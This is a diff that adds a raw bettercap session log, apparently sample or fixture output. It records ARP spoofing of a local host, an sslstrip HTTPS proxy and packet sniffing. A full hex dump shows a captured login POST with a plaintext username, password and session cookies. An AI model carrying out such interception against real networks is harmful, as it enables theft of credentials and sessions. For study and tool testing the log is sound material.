@@ -1,0 +1,138 @@
+[15:30:46] [[32msys.log[0m] [[2m[30m[100mdbg[0m] FindGateway(eth1) [cmd=ip opts=[route] parser=^(default|[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\svia\s([0-9]+\.[0-9]+\.[0-9]+\.[0-9]+)\sdev\s(\S+).*$]
+[15:30:46] [[32msys.log[0m] [[2m[30m[100mdbg[0m] FindGateway(eth1) output:
+default via 192.168.2.254 dev eth1 proto dhcp metric 100 
+192.168.2.0/24 dev eth1 proto kernel scope link src 192.168.2.12 metric 100
+[15:30:46] [[32msys.log[0m] [[2m[30m[100mdbg[0m] FindGateway(eth1) line 'default via 192.168.2.254 dev eth1 proto dhcp metric 100' matched with [default via 192.168.2.254 dev eth1 proto dhcp metric 100 default 192.168.2.254 eth1]
+[15:30:46] [[32msys.log[0m] [[2m[30m[100mdbg[0m] gateway is 192.168.2.254[34:4d:ea:88:24:a4]
+[15:30:46] [[32msession.started[0m] {session.started 2019-10-25 15:30:46.359882594 -0400 EDT m=+0.251480188 <nil>}
+[15:30:46] [[32mmod.started[0m] events.stream
+[15:30:46] [[32mmod.stopped[0m] events.stream
+[15:30:46] [[32mmod.started[0m] events.stream
+[15:30:46] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mnet.sniff[0m[0m starting net.recon as a requirement for net.sniff
+[15:30:46] [[32mmod.started[0m] net.recon
+[15:30:46] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mhttps.proxy[0m[0m loading proxy certification authority TLS certificate from /root/.bettercap-ca.cert.pem
+[15:30:46] [[32mmod.started[0m] net.sniff
+[15:30:46] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mhttps.proxy[0m[0m loading proxy certification authority TLS key from /root/.bettercap-ca.key.pem
+[15:30:46] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mhttp.proxy[0m[0m enabling forwarding.
+[15:30:46] [[32msys.log[0m] [[2m[30m[100mdbg[0m] [104m[30mhttp.proxy[0m[0m applied redirection [eth1] (TCP) :443 -> 192.168.2.12:8083
+[15:30:46] [[32mmod.started[0m] https.proxy
+[15:30:46] [[32msys.log[0m] [[97m[42minf[0m] [104m[30mhttps.proxy[0m[0m started on 192.168.2.12:8083 (sslstrip [33menabled[0m)
+[15:30:46] [[32msys.log[0m] [[2m[30m[100mdbg[0m] [104m[30marp.spoof[0m[0m  addresses=[192.168.2.13] macs=[] whitelisted-addresses=[] whitelisted-macs=[]
+[15:30:46] [[32mmod.started[0m] arp.spoof
+[15:30:46] [[32msys.log[0m] [[97m[43mwar[0m] [104m[30marp.spoof[0m[0m arp spoofer started targeting 254 possible network neighbours of 1 targets.
+[15:31:30] [[32msys.log[0m] [[2m[30m[100mdbg[0m] -- FULL PACKET DATA (797 bytes) ------------------------------------
+00000000  34 4d ea 88 24 a4 08 00  27 46 4e b4 86 dd 60 00  |4M..$...'FN...`.|
+00000010  00 00 02 e7 06 40 2a 02  a4 49 55 45 00 01 4d aa  |.....@*..IUE..M.|
+00000020  6b 27 ed a0 ce 01 26 06  47 00 00 30 00 00 00 00  |k'....&.G..0....|
+00000030  00 00 68 1c 1f 40 c0 11  00 50 6e e6 7a 59 4d 82  |..h..@...Pn.zYM.|
+00000040  e7 8e 50 18 41 12 d9 63  00 00 50 4f 53 54 20 2f  |..P.A..c..POST /|
+00000050  6c 6f 67 69 6e 2e 70 68  70 20 48 54 54 50 2f 31  |login.php HTTP/1|
+00000060  2e 31 0d 0a 41 63 63 65  70 74 3a 20 69 6d 61 67  |.1..Accept: imag|
+00000070  65 2f 6a 70 65 67 2c 20  61 70 70 6c 69 63 61 74  |e/jpeg, applicat|
+00000080  69 6f 6e 2f 78 2d 6d 73  2d 61 70 70 6c 69 63 61  |ion/x-ms-applica|
+00000090  74 69 6f 6e 2c 20 69 6d  61 67 65 2f 67 69 66 2c  |tion, image/gif,|
+000000a0  20 61 70 70 6c 69 63 61  74 69 6f 6e 2f 78 61 6d  | application/xam|
+000000b0  6c 2b 78 6d 6c 2c 20 69  6d 61 67 65 2f 70 6a 70  |l+xml, image/pjp|
+000000c0  65 67 2c 20 61 70 70 6c  69 63 61 74 69 6f 6e 2f  |eg, application/|
+000000d0  78 2d 6d 73 2d 78 62 61  70 2c 20 61 70 70 6c 69  |x-ms-xbap, appli|
+000000e0  63 61 74 69 6f 6e 2f 78  2d 73 68 6f 63 6b 77 61  |cation/x-shockwa|
+000000f0  76 65 2d 66 6c 61 73 68  2c 20 2a 2f 2a 0d 0a 52  |ve-flash, */*..R|
+00000100  65 66 65 72 65 72 3a 20  68 74 74 70 3a 2f 2f 70  |eferer: http://p|
+00000110  65 72 72 6f 73 2e 63 6f  6d 2f 0d 0a 41 63 63 65  |erros.com/..Acce|
+00000120  70 74 2d 4c 61 6e 67 75  61 67 65 3a 20 65 6e 2d  |pt-Language: en-|
+00000130  55 53 0d 0a 55 73 65 72  2d 41 67 65 6e 74 3a 20  |US..User-Agent: |
+00000140  4d 6f 7a 69 6c 6c 61 2f  34 2e 30 20 28 63 6f 6d  |Mozilla/4.0 (com|
+00000150  70 61 74 69 62 6c 65 3b  20 4d 53 49 45 20 38 2e  |patible; MSIE 8.|
+00000160  30 3b 20 57 69 6e 64 6f  77 73 20 4e 54 20 36 2e  |0; Windows NT 6.|
+00000170  31 3b 20 54 72 69 64 65  6e 74 2f 34 2e 30 3b 20  |1; Trident/4.0; |
+00000180  53 4c 43 43 32 3b 20 2e  4e 45 54 20 43 4c 52 20  |SLCC2; .NET CLR |
+00000190  32 2e 30 2e 35 30 37 32  37 3b 20 2e 4e 45 54 20  |2.0.50727; .NET |
+000001a0  43 4c 52 20 33 2e 35 2e  33 30 37 32 39 3b 20 2e  |CLR 3.5.30729; .|
+000001b0  4e 45 54 20 43 4c 52 20  33 2e 30 2e 33 30 37 32  |NET CLR 3.0.3072|
+000001c0  39 3b 20 4d 65 64 69 61  20 43 65 6e 74 65 72 20  |9; Media Center |
+000001d0  50 43 20 36 2e 30 29 0d  0a 43 6f 6e 74 65 6e 74  |PC 6.0)..Content|
+000001e0  2d 54 79 70 65 3a 20 61  70 70 6c 69 63 61 74 69  |-Type: applicati|
+000001f0  6f 6e 2f 78 2d 77 77 77  2d 66 6f 72 6d 2d 75 72  |on/x-www-form-ur|
+00000200  6c 65 6e 63 6f 64 65 64  0d 0a 41 63 63 65 70 74  |lencoded..Accept|
+00000210  2d 45 6e 63 6f 64 69 6e  67 3a 20 67 7a 69 70 2c  |-Encoding: gzip,|
+00000220  20 64 65 66 6c 61 74 65  0d 0a 48 6f 73 74 3a 20  | deflate..Host: |
+00000230  70 65 72 72 6f 73 2e 63  6f 6d 0d 0a 43 6f 6e 74  |perros.com..Cont|
+00000240  65 6e 74 2d 4c 65 6e 67  74 68 3a 20 35 37 0d 0a  |ent-Length: 57..|
+00000250  43 6f 6e 6e 65 63 74 69  6f 6e 3a 20 4b 65 65 70  |Connection: Keep|
+00000260  2d 41 6c 69 76 65 0d 0a  43 61 63 68 65 2d 43 6f  |-Alive..Cache-Co|
+00000270  6e 74 72 6f 6c 3a 20 6e  6f 2d 63 61 63 68 65 0d  |ntrol: no-cache.|
+00000280  0a 43 6f 6f 6b 69 65 3a  20 5f 5f 63 66 64 75 69  |.Cookie: __cfdui|
+00000290  64 3d 64 64 31 35 62 35  64 31 34 36 33 33 32 30  |d=dd15b5d1463320|
+000002a0  38 65 38 33 65 35 66 62  35 64 31 39 63 35 65 30  |8e83e5fb5d19c5e0|
+000002b0  62 33 38 31 35 37 31 36  30 31 39 35 35 3b 20 70  |b381571601955; p|
+000002c0  65 72 72 6f 73 3d 75 67  39 64 33 63 36 30 6b 61  |erros=ug9d3c60ka|
+000002d0  74 72 68 69 64 6b 34 34  76 6a 68 65 37 67 63 31  |trhidk44vjhe7gc1|
+000002e0  0d 0a 0d 0a 72 65 64 69  72 3d 25 32 46 26 65 6d  |....redir=%2F&em|
+000002f0  61 69 6c 3d 61 64 6d 69  6e 26 70 61 73 73 3d 6d  |ail=admin&pass=m|
+00000300  79 73 74 72 6f 6e 67 70  61 73 73 77 6f 72 64 26  |ystrongpassword&|
+00000310  45 6e 76 69 61 72 3d 45  6e 74 72 61 72           |Enviar=Entrar|
+--- Layer 1 ---
+Ethernet	{Contents=[..14..] Payload=[..783..] SrcMAC=08:00:27:46:4e:b4 DstMAC=34:4d:ea:88:24:a4 EthernetType=IPv6 Length=0}
+00000000  34 4d ea 88 24 a4 08 00  27 46 4e b4 86 dd        |4M..$...'FN...|
+--- Layer 2 ---
+IPv6	{Contents=[..40..] Payload=[..743..] Version=6 TrafficClass=0 FlowLabel=0 Length=743 NextHeader=TCP HopLimit=64 SrcIP=2a02:a449:5545:1:4daa:6b27:eda0:ce01 DstIP=2606:4700:30::681c:1f40 HopByHop=nil}
+00000000  60 00 00 00 02 e7 06 40  2a 02 a4 49 55 45 00 01  |`......@*..IUE..|
+00000010  4d aa 6b 27 ed a0 ce 01  26 06 47 00 00 30 00 00  |M.k'....&.G..0..|
+00000020  00 00 00 00 68 1c 1f 40                           |....h..@|
+--- Layer 3 ---
+TCP	{Contents=[..20..] Payload=[..723..] SrcPort=49169 DstPort=80(http) Seq=1860598361 Ack=1300424590 DataOffset=5 FIN=false SYN=false RST=false PSH=true ACK=true URG=false ECE=false CWR=false NS=false Window=16658 Checksum=55651 Urgent=0 Options=[] Padding=[]}
+00000000  c0 11 00 50 6e e6 7a 59  4d 82 e7 8e 50 18 41 12  |...Pn.zYM...P.A.|
+00000010  d9 63 00 00                                       |.c..|
+--- Layer 4 ---
+Payload	723 byte(s)
+00000000  50 4f 53 54 20 2f 6c 6f  67 69 6e 2e 70 68 70 20  |POST /login.php |
+00000010  48 54 54 50 2f 31 2e 31  0d 0a 41 63 63 65 70 74  |HTTP/1.1..Accept|
+00000020  3a 20 69 6d 61 67 65 2f  6a 70 65 67 2c 20 61 70  |: image/jpeg, ap|
+00000030  70 6c 69 63 61 74 69 6f  6e 2f 78 2d 6d 73 2d 61  |plication/x-ms-a|
+00000040  70 70 6c 69 63 61 74 69  6f 6e 2c 20 69 6d 61 67  |pplication, imag|
+00000050  65 2f 67 69 66 2c 20 61  70 70 6c 69 63 61 74 69  |e/gif, applicati|
+00000060  6f 6e 2f 78 61 6d 6c 2b  78 6d 6c 2c 20 69 6d 61  |on/xaml+xml, ima|
+00000070  67 65 2f 70 6a 70 65 67  2c 20 61 70 70 6c 69 63  |ge/pjpeg, applic|
+00000080  61 74 69 6f 6e 2f 78 2d  6d 73 2d 78 62 61 70 2c  |ation/x-ms-xbap,|
+00000090  20 61 70 70 6c 69 63 61  74 69 6f 6e 2f 78 2d 73  | application/x-s|
+000000a0  68 6f 63 6b 77 61 76 65  2d 66 6c 61 73 68 2c 20  |hockwave-flash, |
+000000b0  2a 2f 2a 0d 0a 52 65 66  65 72 65 72 3a 20 68 74  |*/*..Referer: ht|
+000000c0  74 70 3a 2f 2f 70 65 72  72 6f 73 2e 63 6f 6d 2f  |tp://perros.com/|
+000000d0  0d 0a 41 63 63 65 70 74  2d 4c 61 6e 67 75 61 67  |..Accept-Languag|
+000000e0  65 3a 20 65 6e 2d 55 53  0d 0a 55 73 65 72 2d 41  |e: en-US..User-A|
+000000f0  67 65 6e 74 3a 20 4d 6f  7a 69 6c 6c 61 2f 34 2e  |gent: Mozilla/4.|
+00000100  30 20 28 63 6f 6d 70 61  74 69 62 6c 65 3b 20 4d  |0 (compatible; M|
+00000110  53 49 45 20 38 2e 30 3b  20 57 69 6e 64 6f 77 73  |SIE 8.0; Windows|
+00000120  20 4e 54 20 36 2e 31 3b  20 54 72 69 64 65 6e 74  | NT 6.1; Trident|
+00000130  2f 34 2e 30 3b 20 53 4c  43 43 32 3b 20 2e 4e 45  |/4.0; SLCC2; .NE|
+00000140  54 20 43 4c 52 20 32 2e  30 2e 35 30 37 32 37 3b  |T CLR 2.0.50727;|
+00000150  20 2e 4e 45 54 20 43 4c  52 20 33 2e 35 2e 33 30  | .NET CLR 3.5.30|
+00000160  37 32 39 3b 20 2e 4e 45  54 20 43 4c 52 20 33 2e  |729; .NET CLR 3.|
+00000170  30 2e 33 30 37 32 39 3b  20 4d 65 64 69 61 20 43  |0.30729; Media C|
+00000180  65 6e 74 65 72 20 50 43  20 36 2e 30 29 0d 0a 43  |enter PC 6.0)..C|
+00000190  6f 6e 74 65 6e 74 2d 54  79 70 65 3a 20 61 70 70  |ontent-Type: app|
+000001a0  6c 69 63 61 74 69 6f 6e  2f 78 2d 77 77 77 2d 66  |lication/x-www-f|
+000001b0  6f 72 6d 2d 75 72 6c 65  6e 63 6f 64 65 64 0d 0a  |orm-urlencoded..|
+000001c0  41 63 63 65 70 74 2d 45  6e 63 6f 64 69 6e 67 3a  |Accept-Encoding:|
+000001d0  20 67 7a 69 70 2c 20 64  65 66 6c 61 74 65 0d 0a  | gzip, deflate..|
+000001e0  48 6f 73 74 3a 20 70 65  72 72 6f 73 2e 63 6f 6d  |Host: perros.com|
+000001f0  0d 0a 43 6f 6e 74 65 6e  74 2d 4c 65 6e 67 74 68  |..Content-Length|
+00000200  3a 20 35 37 0d 0a 43 6f  6e 6e 65 63 74 69 6f 6e  |: 57..Connection|
+00000210  3a 20 4b 65 65 70 2d 41  6c 69 76 65 0d 0a 43 61  |: Keep-Alive..Ca|
+00000220  63 68 65 2d 43 6f 6e 74  72 6f 6c 3a 20 6e 6f 2d  |che-Control: no-|
+00000230  63 61 63 68 65 0d 0a 43  6f 6f 6b 69 65 3a 20 5f  |cache..Cookie: _|
+00000240  5f 63 66 64 75 69 64 3d  64 64 31 35 62 35 64 31  |_cfduid=dd15b5d1|
+00000250  34 36 33 33 32 30 38 65  38 33 65 35 66 62 35 64  |4633208e83e5fb5d|
+00000260  31 39 63 35 65 30 62 33  38 31 35 37 31 36 30 31  |19c5e0b381571601|
+00000270  39 35 35 3b 20 70 65 72  72 6f 73 3d 75 67 39 64  |955; perros=ug9d|
+00000280  33 63 36 30 6b 61 74 72  68 69 64 6b 34 34 76 6a  |3c60katrhidk44vj|
+00000290  68 65 37 67 63 31 0d 0a  0d 0a 72 65 64 69 72 3d  |he7gc1....redir=|
+000002a0  25 32 46 26 65 6d 61 69  6c 3d 61 64 6d 69 6e 26  |%2F&email=admin&|
+000002b0  70 61 73 73 3d 6d 79 73  74 72 6f 6e 67 70 61 73  |pass=mystrongpas|
+000002c0  73 77 6f 72 64 26 45 6e  76 69 61 72 3d 45 6e 74  |sword&Enviar=Ent|
+000002d0  72 61 72                                          |rar|
+
+[15:31:30] [[32msys.log[0m] [[2m[30m[100mdbg[0m] Unexpected layer type IPv6, skipping packet.
+[15:31:44] [[32mmod.stopped[0m] arp.spoof
+[15:31:44] [[32msys.log[0m] [[97m[42minf[0m] [104m[30marp.spoof[0m[0m waiting for ARP spoofer to stop ...
+[15:31:44] [[32msys.log[0m] [[97m[42minf[0m] [104m[30marp.spoof[0m[0m restoring ARP cache of 1 targets.
